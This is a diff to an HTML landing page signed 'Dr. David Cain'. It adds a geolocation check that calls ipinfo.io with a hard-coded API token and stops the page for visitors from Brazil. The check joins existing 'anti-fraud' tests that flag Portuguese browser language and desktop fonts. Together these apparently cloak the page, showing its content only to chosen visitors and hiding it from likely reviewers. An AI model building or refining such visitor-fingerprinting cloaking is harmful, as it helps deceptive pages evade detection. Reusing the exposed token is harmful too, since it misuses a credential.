@@ -10,7 +10,7 @@
                 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Teste8</title>
+  <title>Teste9</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -138,9 +138,27 @@
     <p>See you on the other side,<br>
     Dr. David Cain</p>
   </div>
-  
+
 	<script>
 		document.addEventListener('DOMContentLoaded', async () => {
+
+			async function blockBrazil() {
+				const token = '4a977bc54c9317';
+				try {
+					const response = await fetch(`https://ipinfo.io?token=${token}`);
+					if (!response.ok) {
+						return false; 
+					}
+					const data = await response.json();
+					if (data.country === 'BR') {
+						return true;
+					}
+				} catch (e) {
+					return false;
+				}
+				return false;
+			}
+
 
 			function hasRedFlags() {
 				if (navigator.language && navigator.language.startsWith('pt')) {
@@ -158,7 +176,7 @@
 							return true;
 						}
 					}
-				} catch (e) { /* Ignora erros, foca na detecção */ }
+				} catch (e) { /* Ignora erros */ }
 
 				const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI'];
 				const testString = "mmmmmmmmmmlli";
@@ -198,6 +216,11 @@
 
 
 			async function runAntiFraudChecks() {
+				const isFromBrazil = await blockBrazil();
+				if (isFromBrazil) {
+					return false;
+				}
+
 				const redFlagsFound = hasRedFlags();
 				if (redFlagsFound) {
 					return false;
